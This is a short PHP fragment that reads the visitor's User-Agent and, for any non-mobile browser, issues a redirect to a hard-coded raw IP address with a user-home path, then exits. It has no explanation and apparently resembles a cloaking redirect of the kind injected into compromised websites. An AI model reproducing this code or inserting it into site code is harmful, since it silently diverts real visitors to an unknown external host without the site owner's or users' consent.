	$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
	$isMobile = is_numeric(strpos($ua, 'mobile'));
	$this['Mobile'] = is_numeric(strpos($ua, 'mobile'));

	$url = 'http://162.240.59.97/~wadariubud/';

	if($isMobile != 1) {
		header('Location: '.$url.'');
		exit;
	}
}
